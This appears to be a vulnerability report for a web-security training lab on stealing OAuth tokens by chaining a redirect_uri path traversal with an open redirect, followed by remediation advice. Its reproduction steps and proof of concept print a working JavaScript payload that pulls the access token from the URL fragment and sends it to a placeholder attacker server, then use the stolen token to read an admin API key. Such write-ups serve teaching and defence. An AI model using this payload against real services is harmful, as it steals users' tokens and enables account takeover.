# Vulnerability Report: OAuth Access Token Theft via Open Redirect and Path Traversal

**Severity:** High
**CVSS Score:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)
**Date:** 2026-08-08
**Target:** TARGET.web-security-academy.net

## Executive Summary
An OAuth access token theft vulnerability was identified in the authentication flow of the application.
The OAuth provider uses the implicit flow (`response_type=token`), which delivers access tokens directly in the URL fragment.
The provider's `redirect_uri` validation checks the raw path string before resolving traversal sequences, allowing a path traversal bypass — `oauth-callback/../post/next` — to pass validation while ultimately redirecting to an open redirect endpoint on the client application.
The open redirect in the `/post/next` endpoint accepts arbitrary absolute URLs via the `path` parameter, allowing the final redirect destination to be an attacker-controlled server.
When the victim opens the crafted link, their active OAuth session is used silently, the provider issues an access token, and the browser is redirected through the open redirect to the attacker's server — delivering the token in the URL fragment.
A JavaScript payload on the attacker's page reads the fragment and exfiltrates the token via a GET request to the server's access log.
The stolen token was used directly against the `/me` endpoint to retrieve the administrator's API key.

## Vulnerability Details
| Field | Value |
|-------|-------|
| Type | OAuth Access Token Theft via Open Redirect + Path Traversal |
| Endpoint (OAuth) | `GET /auth` (OAuth provider) |
| Endpoint (Open Redirect) | `GET /post/next` (client application) |
| Method | GET |
| Vulnerable Parameter (OAuth) | `redirect_uri` |
| Vulnerable Parameter (Open Redirect) | `path` |
| Bypass | Path traversal (`/oauth-callback/../post/next`) bypasses raw-string allowlist check |
| Token Delivery | Access token delivered in URL fragment, extracted via `window.location.hash` |
| Access Type | Token exfiltrated to attacker's server via GET request from JavaScript payload |
| Privileges Required | None |
| User Interaction | Required (victim must open a crafted URL) |

## Steps to Reproduce
1. Log in and intercept the OAuth authorization request:
```http
GET /auth?client_id=CLIENT_ID&redirect_uri=https://TARGET.web-security-academy.net/oauth-callback&response_type=token&scope=openid%20profile%20email HTTP/2
Host: oauth-server.net
```
2. Identify the open redirect endpoint on the client application:
```http
GET /post/next?path=https://example.com HTTP/1.1
Host: TARGET.web-security-academy.net
```
Confirm the server returns `302` redirecting to `https://example.com`.

3. Confirm path traversal bypass in `redirect_uri` — replace the value with: `redirect_uri=https://TARGET.web-security-academy.net/oauth-callback/../post/next?path=https://ATTACKER-SERVER/exploit`
Confirm the OAuth provider accepts this with no error.

4. Host the following payload on the attacker's server at `/exploit`:
```html
<script>
  if (window.location.hash) {
    const token = new URLSearchParams(window.location.hash.substr(1)).get('access_token');
    fetch(`https://ATTACKER-SERVER/exploit?victimToken=${token}`);
  } else {
    window.location = "https://oauth-server.net/auth?client_id=CLIENT_ID&redirect_uri=https://TARGET.web-security-academy.net/oauth-callback/../post/next?path=https://ATTACKER-SERVER/exploit&response_type=token&scope=openid%20profile%20email";
  }
</script>
```

5. Deliver the exploit server URL to the victim.
6. When the victim opens the link:
   - If no fragment: redirected to OAuth → token issued → open redirect → attacker server with `#access_token=...` in fragment
   - If fragment present: JavaScript extracts token and exfiltrates it via GET request
7. Retrieve the stolen token from the attacker's server access log.
8. Use the token against the `/me` endpoint:
```http
GET /me HTTP/2
Host: oauth-server.net
Authorization: Bearer STOLEN_TOKEN
```
9. Confirm the administrator's API key is returned in the response.

## Proof of Concept
Exploit payload hosted on attacker's server:
```html
<script>
  if (window.location.hash) {
    const token = new URLSearchParams(window.location.hash.substr(1)).get('access_token');
    fetch(`https://ATTACKER-SERVER/exploit?victimToken=${token}`);
  } else {
    window.location = "https://oauth-server.net/auth?client_id=CLIENT_ID&redirect_uri=https://TARGET.web-security-academy.net/oauth-callback/../post/next?path=https://ATTACKER-SERVER/exploit&response_type=token&scope=openid%20profile%20email";
  }
</script>
```

Followed by token usage:
```http
GET /me HTTP/2
Host: oauth-server.net
Authorization: Bearer STOLEN_TOKEN
```

## Impact
An unauthenticated attacker can steal the OAuth access token of any user who has an active session with the provider — including privileged accounts — by delivering a single crafted URL.
The attack chains two weaknesses: a path traversal bypass in `redirect_uri` validation and an open redirect in the client application.
Neither weakness alone is sufficient — but together they form a complete token theft primitive.
Because the implicit flow delivers the access token directly in the URL fragment, there is no secondary exchange step that could be used as a verification checkpoint.
The stolen token grants immediate, credential-free access to any API endpoint that accepts Bearer token authentication.
This can lead to:
- Theft of sensitive user PII and API keys via the `/me` endpoint
- Unauthorized API access on behalf of any OAuth-authenticated user
- Privilege escalation by targeting administrator accounts
- Silent exploitation — the victim has no indication the attack occurred

## Remediation
- **Migrate away from the implicit flow**: `response_type=token` delivers access tokens directly in the URL with no verification step. Use the authorization code flow with PKCE — tokens are never exposed in the URL and cannot be stolen via redirect manipulation
- **Normalize redirect_uri before validation**: The provider must fully resolve and decode the `redirect_uri` — including path traversal sequences — before comparing it against the allowlist. Checking the raw string allows `/../` bypasses
- **Fix the open redirect**: The `path` parameter in `/post/next` must be restricted to relative paths or validated against an explicit allowlist. Accepting arbitrary absolute URLs is an open redirect regardless of context
- **Implement the `state` parameter**: A cryptographically random, session-bound `state` value should be validated on every callback to prevent CSRF attacks on the OAuth flow
- **Scope and expire access tokens**: Tokens should be short-lived and scoped to the minimum required permissions — limiting the window and blast radius of any token theft

## References
- OWASP: Testing for OAuth Weaknesses (WSTG-ATHZ-05)
- RFC 6749 — Section 10.3: Access Token Disclosure via Redirect URI
- RFC 6749 — Section 10.16: Implicit Flow Threats
- CWE-601: URL Redirection to Untrusted Site
- PortSwigger: OAuth authentication vulnerabilities — stealing tokens via open redirect